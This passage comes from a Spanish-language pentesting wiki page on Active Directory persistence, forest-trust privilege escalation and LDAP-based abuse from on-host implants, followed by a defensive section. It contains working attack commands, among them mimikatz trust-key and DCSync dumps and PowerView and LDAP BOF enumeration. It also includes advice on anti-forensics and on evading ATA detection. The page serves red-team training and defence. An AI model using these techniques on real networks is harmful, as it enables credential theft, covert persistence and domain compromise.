{{#endref}}

### Diamond Ticket

Son como golden tickets forjados de una manera que **evita los mecanismos comunes de detección de golden tickets.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Tener certificados de una cuenta o poder solicitarlos** es una muy buena forma de persistir en la cuenta de un usuario (incluso si este cambia la contraseña):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}

### **Certificates Domain Persistence**

**Usar certificados también permite persistir con altos privilegios dentro del dominio:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

El objeto **AdminSDHolder** en Active Directory asegura la seguridad de los **grupos privilegiados** (como Domain Admins y Enterprise Admins) aplicando una **ACL** estándar a través de estos grupos para prevenir cambios no autorizados. Sin embargo, esta característica puede ser explotada; si un atacante modifica la ACL de AdminSDHolder para dar acceso total a un usuario normal, ese usuario obtiene control extenso sobre todos los grupos privilegiados. Esta medida de seguridad, pensada para proteger, puede volverse contraproducente y permitir acceso no deseado a menos que se supervise de cerca.

[**More information about AdminDSHolder Group here.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

Dentro de cada **Domain Controller (DC)** existe una cuenta de **administrador local**. Al obtener derechos de admin en tal máquina, el hash del Administrador local puede extraerse usando **mimikatz**. Después de esto, es necesaria una modificación del registro para **habilitar el uso de esta contraseña**, permitiendo el acceso remoto a la cuenta de Administrador local.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Podrías **dar** algunos **permisos especiales** a un **usuario** sobre ciertos objetos de dominio que permitirán al usuario **escalar privilegios en el futuro**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

Los **security descriptors** se usan para **almacenar** los **permisos** que un **objeto** tiene **sobre** otro **objeto**. Si sólo puedes **hacer** un **pequeño cambio** en el **security descriptor** de un objeto, puedes obtener privilegios muy interesantes sobre ese objeto sin necesitar ser miembro de un grupo privilegiado.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Abusa de la clase auxiliar `dynamicObject` para crear principals/GPOs/registros DNS de corta duración con `entryTTL`/`msDS-Entry-Time-To-Die`; se autodestruyen sin tombstones, borrando evidencia LDAP mientras dejan SIDs huérfanos, referencias `gPLink` rotas o respuestas DNS cacheadas (por ejemplo, contaminación de ACEs en AdminSDHolder o `gPCFileSysPath` malicioso/ redirecciones DNS integradas en AD).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Alterar **LSASS** en memoria para establecer una **contraseña universal**, concediendo acceso a todas las cuentas del dominio.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Puedes crear tu **propio SSP** para **capturar** en **texto claro** las **credenciales** usadas para acceder a la máquina.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Registra un **nuevo Domain Controller** en el AD y lo usa para **empujar atributos** (SIDHistory, SPNs...) en objetos especificados **sin** dejar ningún **log** respecto a las **modificaciones**. Necesitas privilegios DA y estar dentro del **root domain**.\
Ten en cuenta que si usas datos incorrectos, aparecerán logs bastante feos.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Anteriormente hemos discutido cómo escalar privilegios si tienes **suficiente permiso para leer contraseñas LAPS**. Sin embargo, estas contraseñas también pueden usarse para **mantener persistencia**.\
Consulta:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft considera el **Forest** como el límite de seguridad. Esto implica que **comprometer un único dominio podría potencialmente llevar a que todo el Forest sea comprometido**.

### Basic Information

Un [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) es un mecanismo de seguridad que permite a un usuario de un **dominio** acceder a recursos en otro **dominio**. Esencialmente crea un enlace entre los sistemas de autenticación de ambos dominios, permitiendo que las verificaciones de autenticación fluyan sin problemas. Cuando los dominios establecen una confianza, intercambian y conservan ciertas **keys** dentro de sus **Domain Controllers (DCs)**, que son cruciales para la integridad de la confianza.

En un escenario típico, si un usuario pretende acceder a un servicio en un **dominio confiable**, primero debe solicitar un ticket especial conocido como **inter-realm TGT** desde el DC de su propio dominio. Este TGT se cifra con una **key** compartida que ambos dominios han acordado. Luego el usuario presenta este TGT al **DC del dominio confiable** para obtener un ticket de servicio (**TGS**). Tras la validación exitosa del inter-realm TGT por parte del DC del dominio confiable, este emite un TGS, otorgando al usuario acceso al servicio.

**Pasos**:

1. Un **equipo cliente** en **Domain 1** inicia el proceso usando su **NTLM hash** para solicitar un **Ticket Granting Ticket (TGT)** a su **Domain Controller (DC1)**.
2. DC1 emite un nuevo TGT si el cliente se autentica correctamente.
3. El cliente solicita entonces un **inter-realm TGT** a DC1, que es necesario para acceder a recursos en **Domain 2**.
4. El inter-realm TGT se cifra con una **trust key** compartida entre DC1 y DC2 como parte de la confianza bidireccional entre dominios.
5. El cliente lleva el inter-realm TGT al **Domain Controller (DC2)** de **Domain 2**.
6. DC2 verifica el inter-realm TGT usando su trust key compartida y, si es válido, emite un **Ticket Granting Service (TGS)** para el servidor en Domain 2 al que el cliente desea acceder.
7. Finalmente, el cliente presenta este TGS al servidor, el cual está cifrado con el hash de la cuenta del servidor, para obtener acceso al servicio en Domain 2.

### Different trusts

Es importante notar que **una confianza puede ser de 1 vía o de 2 vías**. En la opción de 2 vías, ambos dominios se confiarán mutuamente, pero en la relación de confianza **1 vía** uno de los dominios será el **trusted** y el otro el **trusting**. En este último caso, **solo podrás acceder a recursos dentro del trusting domain desde el trusted**.

Si Domain A confía en Domain B, A es el dominio trusting y B es el trusted. Además, en **Domain A**, esto sería una **Outbound trust**; y en **Domain B**, sería una **Inbound trust**.

**Diferentes relaciones de confianza**

- **Parent-Child Trusts**: Esta es una configuración común dentro del mismo forest, donde un child domain automáticamente tiene una two-way transitive trust con su parent domain. Esencialmente, esto significa que las solicitudes de autenticación pueden fluir sin problemas entre el parent y el child.
- **Cross-link Trusts**: Denominadas "shortcut trusts", se establecen entre child domains para acelerar procesos de referral. En forests complejos, las referencias de autenticación típicamente deben subir hasta la raíz del forest y luego bajar al dominio objetivo. Al crear cross-links, el recorrido se acorta, lo cual es especialmente útil en entornos geográficamente distribuidos.
- **External Trusts**: Estas se configuran entre dominios diferentes y no relacionados y son no transitivas por naturaleza. Según la documentación de [Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), las external trusts son útiles para acceder recursos en un dominio fuera del forest actual que no esté conectado por una forest trust. La seguridad se refuerza mediante SID filtering con external trusts.
- **Tree-root Trusts**: Estas trusts se establecen automáticamente entre el forest root domain y una nueva tree root añadida. Aunque no son comunes, las tree-root trusts son importantes para agregar nuevos domain trees a un forest, permitiéndoles mantener un nombre de dominio único y asegurando transitive two-way. Más información en la guía de [Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Este tipo de trust es una two-way transitive trust entre dos forest root domains, también aplicando SID filtering para aumentar las medidas de seguridad.
- **MIT Trusts**: Estas trusts se establecen con dominios Kerberos no-Windows, compatibles con [RFC4120](https://tools.ietf.org/html/rfc4120). MIT trusts son un poco más especializadas y atienden a entornos que requieren integración con sistemas basados en Kerberos fuera del ecosistema Windows.

#### Other differences in **trusting relationships**

- Una relación de confianza también puede ser **transitiva** (A confía en B, B confía en C, entonces A confía en C) o **no transitiva**.
- Una relación de confianza puede configurarse como **bidirectional trust** (ambos se confían mutuamente) o como **one-way trust** (solo uno confía en el otro).

### Attack Path

1. **Enumerar** las relaciones de confianza
2. Comprobar si algún **security principal** (user/group/computer) tiene **acceso** a recursos del **otro dominio**, quizá mediante entradas ACE o por pertenecer a grupos del otro dominio. Buscar **relaciones entre dominios** (probablemente la confianza fue creada para esto).
1. kerberoast en este caso podría ser otra opción.
3. **Comprometer** las **cuentas** que puedan **pivotar** entre dominios.

Los atacantes podrían acceder a recursos en otro dominio mediante tres mecanismos principales:

- **Local Group Membership**: Principales podrían ser añadidos a grupos locales en máquinas, como el grupo “Administrators” en un servidor, otorgándoles control significativo sobre esa máquina.
- **Foreign Domain Group Membership**: Los principales también pueden ser miembros de grupos dentro del dominio extranjero. Sin embargo, la efectividad de este método depende de la naturaleza de la confianza y del alcance del grupo.
- **Access Control Lists (ACLs)**: Los principales pueden estar especificados en una **ACL**, particularmente como entidades en **ACEs** dentro de una **DACL**, proporcionándoles acceso a recursos específicos. Para quienes quieran profundizar en la mecánica de ACLs, DACLs y ACEs, el whitepaper titulado “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” es un recurso invalorable.

### Find external users/groups with permissions

Puedes comprobar **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** para encontrar foreign security principals en el dominio. Estos serán usuarios/grupos de **un dominio/forest externo**.

Puedes comprobar esto en Bloodhound o usando powerview:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Escalada de privilegios Child-to-Parent en el bosque
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Otras formas de enumerar las relaciones de confianza de dominio:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Hay **2 trusted keys**, una para _Child --> Parent_ y otra para _Parent_ --> _Child_.\
> Puedes identificar cuál usa el dominio actual con:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Escalar a Enterprise admin al child/parent domain abusando del trust con SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Explotar Configuration NC escribible

Entender cómo se puede explotar la Configuration NC es crucial. La Configuration NC funciona como un repositorio central de datos de configuración a lo largo de un bosque en entornos de Active Directory (AD). Estos datos se replican a cada Domain Controller (DC) dentro del bosque, y los DCs con capacidad de escritura mantienen una copia escribible de la Configuration NC. Para explotarla, se deben tener **privilegios SYSTEM en un DC**, preferiblemente un child DC.

**Vincular GPO al sitio root del DC**

El contenedor Sites de la Configuration NC incluye información sobre los sitios de todos los equipos unidos al dominio dentro del bosque AD. Operando con privilegios SYSTEM en cualquier DC, un atacante puede vincular GPOs a los sitios root de los DC. Esta acción puede comprometer el dominio root al manipular las políticas aplicadas a esos sitios.

Para información detallada, se puede consultar la investigación sobre [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research).

**Comprometer cualquier gMSA en el bosque**

Un vector de ataque consiste en apuntar a gMSAs privilegiados dentro del dominio. La KDS Root key, esencial para calcular las contraseñas de los gMSAs, se almacena en la Configuration NC. Con privilegios SYSTEM en cualquier DC, es posible acceder a la KDS Root key y calcular las contraseñas de cualquier gMSA en todo el bosque.

Detailed analysis and step-by-step guidance can be found in:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Complementary delegated MSA attack (BadSuccessor – abusing migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Investigación externa adicional: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

Este método requiere paciencia, esperando la creación de nuevos objetos AD privilegiados. Con privilegios SYSTEM, un atacante puede modificar el AD Schema para otorgar a cualquier usuario control total sobre todas las clases. Esto podría conducir a acceso y control no autorizados sobre los objetos AD recién creados.

Para más información, ver [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

La vulnerabilidad ADCS ESC5 permite controlar objetos de la Public Key Infrastructure (PKI) para crear una plantilla de certificado que posibilita la autenticación como cualquier usuario dentro del bosque. Como los objetos PKI residen en la Configuration NC, comprometer un child DC escribible permite ejecutar ataques ESC5.

Más detalles sobre esto se pueden leer en [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). En escenarios sin ADCS, el atacante puede configurar los componentes necesarios, como se discute en [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).

### Dominio de bosque externo - Unidireccional (Inbound) o bidireccional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
En este escenario, **un dominio externo confía en tu dominio**, **otorgándote permisos indeterminados** sobre él. Deberás averiguar **qué principales de tu dominio tienen qué acceso sobre el dominio externo** y luego intentar explotarlo:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Dominio de Bosque Externo - Unidireccional (Saliente)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
En este escenario **tu dominio** está **confiando** algunos **privilegios** a un principal de **dominios diferentes**.

Sin embargo, cuando un **dominio es trusted** por el dominio que confía, el dominio trusted **crea un usuario** con un **nombre predecible** que usa como **contraseña la contraseña del dominio trusted**. Lo que significa que es posible **acceder con un usuario del dominio que confía para entrar en el dominio trusted** para enumerarlo y tratar de escalar más privilegios:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Otra forma de comprometer el dominio trusted es encontrar un [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) creado en la **dirección opuesta** de la trust de dominio (lo cual no es muy común).

Otra forma de comprometer el dominio trusted es esperar en una máquina donde un **usuario del dominio trusted pueda acceder** para iniciar sesión vía **RDP**. Entonces, el atacante podría inyectar código en el proceso de la sesión RDP y **acceder al dominio de origen de la víctima** desde allí.\
Además, si la **víctima montó su disco duro**, desde el proceso de la **sesión RDP** el atacante podría almacenar **backdoors** en la **carpeta de inicio del disco duro**. Esta técnica se llama **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Mitigación del abuso de trust de dominio

### **SID Filtering:**

- El riesgo de ataques que aprovechan el atributo SIDHistory a través de confianzas entre bosques se mitiga mediante SID Filtering, que está activado por defecto en todas las confianzas inter-forest. Esto se fundamenta en la suposición de que las confianzas intra-forest son seguras, considerando el bosque, en lugar del dominio, como el límite de seguridad según la postura de Microsoft.
- Sin embargo, hay una salvedad: SID Filtering puede interrumpir aplicaciones y el acceso de usuarios, lo que lleva a su desactivación ocasional.

### **Selective Authentication:**

- Para confianzas inter-forest, emplear Selective Authentication asegura que los usuarios de los dos bosques no se autentican automáticamente. En su lugar, se requieren permisos explícitos para que los usuarios accedan a dominios y servidores dentro del dominio o bosque que confía.
- Es importante tener en cuenta que estas medidas no protegen frente a la explotación del writable Configuration Naming Context (NC) ni frente a ataques a la cuenta de trust.

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## Abuso de AD basado en LDAP desde on-host implants

La [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) reimplementa primitivas LDAP estilo bloodyAD como x64 Beacon Object Files que se ejecutan íntegramente dentro de un on-host implant (p. ej., Adaptix C2). Los operadores compilan el paquete con `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, cargan `ldap.axs`, y luego llaman `ldap <subcommand>` desde el beacon. Todo el tráfico circula usando el contexto de seguridad del inicio de sesión actual sobre LDAP (389) con signing/sealing o LDAPS (636) con auto certificate trust, por lo que no se requieren socks proxies ni artefactos en disco.

### Implant-side LDAP enumeration

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, and `get-groupmembers` resuelven nombres cortos/rutas OU en DNs completos y vuelcan los objetos correspondientes.
- `get-object`, `get-attribute`, and `get-domaininfo` obtienen atributos arbitrarios (incluyendo descriptores de seguridad) además de los metadatos del bosque/dominio desde `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation`, and `get-rbcd` exponen candidatos a roasting, configuraciones de delegación y descriptores existentes de [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) directamente desde LDAP.
- `get-acl` y `get-writable --detailed` analizan la DACL para listar trustees, rights (GenericAll/WriteDACL/WriteOwner/attribute writes) y la herencia, proporcionando objetivos inmediatos para la escalada de privilegios mediante ACL.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP write primitives for escalation & persistence

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) permiten al operador preparar nuevos principals o cuentas de máquina donde existan derechos sobre la OU. `add-groupmember`, `set-password`, `add-attribute`, y `set-attribute` secuestran directamente los objetivos una vez que se detectan derechos de write-property.
- Comandos centrados en ACL como `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, y `add-dcsync` traducen WriteDACL/WriteOwner en cualquier objeto AD a restablecimientos de contraseña, control de membresía de grupos o privilegios de replicación DCSync sin dejar artefactos de PowerShell/ADSI. Los comandos `remove-*` correspondientes limpian los ACEs inyectados.

### Delegation, roasting, and Kerberos abuse

- `add-spn`/`set-spn` hacen que un usuario comprometido sea Kerberoastable al instante; `add-asreproastable` (UAC toggle) lo marca para AS-REP roasting sin tocar la contraseña.
- Las macros de delegación (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) reescriben `msDS-AllowedToDelegateTo`, flags de UAC, o `msDS-AllowedToActOnBehalfOfOtherIdentity` desde el beacon, habilitando rutas de ataque constrained/unconstrained/RBCD y eliminando la necesidad de PowerShell remoto o RSAT.

### sidHistory injection, OU relocation, and attack surface shaping

- `add-sidhistory` inyecta SIDs privilegiados en el SID history de un principal controlado (ver [SID-History Injection](sid-history-injection.md)), proporcionando herencia de acceso sigilosa completamente vía LDAP/LDAPS.
- `move-object` cambia el DN/OU de equipos o usuarios, permitiendo a un atacante mover activos a OUs donde ya existen derechos delegados antes de abusar de `set-password`, `add-groupmember` o `add-spn`.
- Comandos de eliminación de alcance estrecho (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, etc.) permiten una reversión rápida después de que el operador coseche credenciales o persistencia, minimizando la telemetría.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Algunas defensas generales

[**Learn more about how to protect credentials here.**](../stealing-credentials/credentials-protections.md)

### **Medidas defensivas para la protección de credenciales**

- **Domain Admins Restrictions**: Se recomienda que Domain Admins solo puedan iniciar sesión en Domain Controllers, evitando su uso en otros hosts.
- **Service Account Privileges**: Los servicios no deben ejecutarse con privilegios de Domain Admin (DA) para mantener la seguridad.
- **Temporal Privilege Limitation**: Para tareas que requieran privilegios DA, la duración debe limitarse. Esto se puede lograr con: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay mitigation**: Auditar los Event IDs 2889/3074/3075 y luego aplicar LDAP signing más LDAPS channel binding en los DCs/clients para bloquear intentos de LDAP MITM/relay.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### **Implementing Deception Techniques**

- Implementar deception implica colocar trampas, como usuarios o equipos señuelo, con características como contraseñas que no expiran o marcados como Trusted for Delegation. Un enfoque detallado incluye crear usuarios con derechos específicos o agregarlos a grupos de alto privilegio.
- Un ejemplo práctico implica usar herramientas como: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Más sobre despliegue de técnicas de deception puede encontrarse en [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identificando Deception**

- **Para objetos de usuario**: Indicadores sospechosos incluyen ObjectSID atípico, inicios de sesión poco frecuentes, fechas de creación y bajo recuento de contraseñas erróneas.
- **Indicadores generales**: Comparar atributos de posibles objetos señuelo con los de objetos genuinos puede revelar inconsistencias. Herramientas como [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) pueden ayudar a identificar tales engaños.

### **Evasión de sistemas de detección**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: Evitar la enumeración de sesiones en Domain Controllers para prevenir la detección por ATA.
- **Ticket Impersonation**: Utilizar claves **aes** para la creación de tickets ayuda a evadir detección al no degradar a NTLM.
- **DCSync Attacks**: Se recomienda ejecutar desde un host que no sea Domain Controller para evitar la detección de ATA, ya que la ejecución directa desde un Domain Controller activará alertas.

## Referencias

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [Hashcat](https://github.com/hashcat/hashcat)

{{#include ../../banners/hacktricks-training.md}}
